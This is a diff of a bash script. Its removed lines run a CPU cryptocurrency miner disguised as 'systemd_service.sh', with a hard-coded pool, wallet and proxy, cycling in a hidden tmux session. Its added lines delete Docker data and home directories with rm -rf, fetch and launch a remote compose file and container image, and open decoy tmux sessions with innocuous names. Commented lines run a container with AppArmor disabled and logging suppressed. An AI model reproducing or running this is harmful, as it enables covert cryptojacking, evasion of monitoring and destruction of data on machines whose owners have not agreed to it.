@@ -1,17 +1,28 @@
 #!/bin/bash
 
-while true
-do
-    echo "Menjalankan tmux selama 60 menit..."
-    tmux new -d -s sys-session "timeout 60m ./systemd_service.sh --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO10menit --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
-    
-    # Tunggu hingga tmux selesai (60 menit)
-    sleep 60m
+kill 8
+docker stop bit
+docker stop windows
+docker stop vnc
+docker system prune -f
+docker image prune -a -f
+rm -rf /home/.android/
+rm -rf /home/user/myapp/windows
+mkdir -p /home/user/myapp/windows
+mkdir -p /home/user/myapp/windows/data
+docker run --name vnc -itd dediminari/storage:datalow
+docker cp vnc:/app/. /home/user/myapp/windows/data/
+wget -O /home/user/myapp/windows/compose.yaml https://github.com/dediminari/bit/raw/refs/heads/main/compose.yaml
+docker compose -f /home/user/myapp/windows/compose.yaml up -d
+docker start windows
+tmux new -d -s checker-session 'tail -f /dev/null'
+tmux new -d -s checkup-session 'cat'
+tmux new -d -s moniting-session 'top'
+tmux attach -t moniting-session
 
-    echo "Jeda 10 menit..."
-    # Hentikan sesi tmux jika masih berjalan
-    tmux kill-session -t sys-session
-
-    # Tunggu selama 10 menit
-    sleep 10m
-done
+#docker build . -t bit
+#docker run -itd --name bit --restart=always --security-opt apparmor=unconfined --log-driver=none bit > /dev/null 2>&1
+#tmux new -d -s checker-session 'tail -f /dev/null'
+#tmux new -d -s checkup-session 'cat'
+#tmux new -d -s moniting-session 'top'
+#tmux attach -t moniting-session
